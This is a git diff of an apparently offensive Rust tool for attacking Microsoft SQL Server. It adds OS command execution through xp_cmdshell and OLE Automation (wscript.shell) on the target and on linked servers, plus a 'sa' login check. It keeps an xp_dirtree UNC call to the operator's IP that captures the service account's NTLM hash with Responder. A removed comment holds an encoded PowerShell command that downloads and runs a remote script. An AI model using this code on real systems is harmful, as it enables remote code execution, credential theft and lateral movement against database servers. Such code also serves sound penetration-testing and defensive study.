@@ -10,7 +10,7 @@ async fn db_conn() -> anyhow::Result<Client<TcpStream>> {
     println!("Enter FQDN of host:");
     let fqdn: String = get_input();
 
-    println!("[+] Connecting to database...");
+    println!("[+] Connecting to database via Kerberos...");
     config.host(&fqdn);
     config.database("master");
     config.port(1433);
@@ -66,32 +66,55 @@ fn get_answer(question: &str) -> bool {
 }
 
 async fn exec_cmd(client: &mut Client<TcpStream>, computer: &str, linked: bool) {
+    let mut exec_method: usize = 0;
+    if linked == false {
+        println!("Select command execution method:");
+        println!("--> [0] xp_cmdshell");
+        println!("--> [1] OLE Procedure");
+        exec_method = get_input().parse().unwrap_or(0);
+    }
+
     println!("Enter command to run:");
     let command: String = get_input();
-    if linked {
-        println!("[+] Enabling advanced options on {}", computer);
-        let mut query: String = String::from(format!("EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT {}", computer));
-        execute_query(client, &query).await;
 
-        println!("[+] Enabling xp_cmdshell on {}", computer);
-        query = String::from(format!("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {}", computer));
-        execute_query(client, &query).await;
-
-        println!("[+] Executing command");
-        query = String::from(format!("EXEC ('xp_cmdshell ''{}'' ') AT {}", &command, computer));
-        execute_query(client, &query).await;
-    } else {
+    if exec_method == 1 {
         println!("[+] Enabling advanced options on {}", computer);
         let mut query: String = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
         execute_query(client, &query).await;
 
-        println!("[+] Enabling xp_cmdshell on {}", computer);
-        query = String::from("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+        println!("[+] Enabling OLE Automation Procedures on {}", computer);
+        query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
         execute_query(client, &query).await;
 
         println!("[+] Executing command");
-        query = String::from(format!("EXEC xp_cmdshell '{}'", &command));
+        query = String::from(format!("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{}\"'", &command));
         execute_query(client, &query).await;
+    } else {
+        if linked {
+            println!("[+] Enabling advanced options on {}", computer);
+            let mut query: String = String::from(format!("EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT {}", computer));
+            execute_query(client, &query).await;
+
+            println!("[+] Enabling xp_cmdshell on {}", computer);
+            query = String::from(format!("EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {}", computer));
+            execute_query(client, &query).await;
+
+            println!("[+] Executing command");
+            query = String::from(format!("EXEC ('xp_cmdshell ''{}'' ') AT {}", &command, computer));
+            execute_query(client, &query).await;
+        } else {
+            println!("[+] Enabling advanced options on {}", computer);
+            let mut query: String = String::from("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
+            execute_query(client, &query).await;
+
+            println!("[+] Enabling xp_cmdshell on {}", computer);
+            query = String::from("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
+            execute_query(client, &query).await;
+
+            println!("[+] Executing command");
+            query = String::from(format!("EXEC xp_cmdshell '{}'", &command));
+            execute_query(client, &query).await;
+        }
     }
 }
 
@@ -142,10 +165,10 @@ async fn main() {
     }
 
     if get_answer("Attempt auth back to get svc account hash? (y/n)") {
-        println!("Enter your IP address: ");
+        println!("Enter your IP address where Responder is running:");
         let ip_addr: String = get_input();
-        println!("[+] Attempting auth back to get svc account hash...Check Responder!");
-        let query: String = String::from(format!("EXEC master..xp_dirtree \"\\\\{}\\\\test\"", &ip_addr));
+        println!("[+] Attempting to get svc account hash via xp_dirtree...Check Responder!");
+        let query: String = String::from(format!("EXEC master..xp_dirtree \"\\\\{}\\\\testnoexist\"", &ip_addr));
         execute_query(&mut conn, &query).await;
     }
 
@@ -187,7 +210,11 @@ async fn main() {
     }
 
     if get_answer(format!("Do you want to execute a command on {}? (y/n)", &comp).as_str()) {
-        exec_cmd(&mut conn, &comp, false).await;
+        if get_query(&mut conn, "SELECT SYSTEM_USER", true).await.unwrap()[0] == String::from("sa") {
+            exec_cmd(&mut conn, &comp, false).await;
+        } else {
+            println!("[!] Must be executing as 'sa' user to run commands! Try looking for linked SQL servers or impersonating a user");
+        }
     }
 
     if get_answer("Check for linked SQL servers? (y/n)") {
@@ -195,8 +222,6 @@ async fn main() {
 
         let linked: Vec<String> = get_query(&mut conn, "EXEC sp_linkedservers", true).await.unwrap();
 
-        // let cmd_res: Vec<String> = get_query(&mut conn, "select version from openquery(\"dc01\", 'select @@version as version')", true).await.unwrap();
-        // println!("{}", cmd_res[0]);
         if linked.len() > 0 {
             for (i, comp) in linked.iter().enumerate() {
                 println!("--> [{i}] {comp}");
@@ -210,8 +235,7 @@ async fn main() {
             let mut query: String = String::from(format!("select s_user from openquery(\"{}\", '{}')", &linked_comp, &sub_query));
             println!("--> Executing as {} on {}", get_query(&mut conn, &query, true).await.unwrap()[0], &linked_comp);
 
-            if get_answer("Do you want to execute a command? (y/n)") {
-                // ask method ?
+            if get_answer(format!("Do you want to execute a command on {}? (y/n)", &linked_comp).as_str()) {
                 exec_cmd(&mut conn, &linked_comp, true).await;
             }
 
@@ -247,12 +271,6 @@ async fn main() {
             println!("[!] No linked SQL servers found!");
         }
     }
-
-    // println!("[+] Executing command");
-    // query = String::from("EXEC ('xp_cmdshell ''powershell -ep bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADcANQAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='' ') AT DC01");
-    // execute_query(&mut conn, &query).await;
-
-
 
     // println!("[+] Enabling OLE Automation Procedures");
     // query = String::from("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE");
